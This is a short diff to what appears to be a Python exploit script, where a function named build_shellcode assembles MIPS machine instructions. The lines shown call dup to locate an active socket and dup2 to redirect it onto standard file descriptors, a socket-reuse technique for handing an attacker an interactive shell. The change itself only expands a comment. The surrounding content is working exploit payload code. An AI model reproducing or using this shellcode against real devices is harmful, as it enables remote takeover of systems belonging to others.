@@ -119,7 +119,7 @@ def build_shellcode():
     shell_code += struct.pack('>L', 0x24040002)     # addiu a0, zero, 0x2
     shell_code += struct.pack('>L', 0x24020fc9)     # addiu v0, zero, 0xfc9     # dup syscall
     shell_code += struct.pack('>L', 0x0000000c)     # syscall
-    shell_code += struct.pack('>L', 0x2044fffe)     # addi a0, v0, -1           # a0 = dup(2) - 1                                       Find the latest active socket
+    shell_code += struct.pack('>L', 0x2044fffe)     # addi a0, v0, -1           # a0 = dup(2) - 1                                       Find the latest active socket (allocates a new file descriptor, then subtract 1)
     
     shell_code += struct.pack('>L', 0x24050002)     # addiu a1, zero, 0x2
     shell_code += struct.pack('>L', 0x24020fdf)     # addiu v0, zero, 0xfdf     # dup2(a0, 2)                                           Use the found socket as stderr
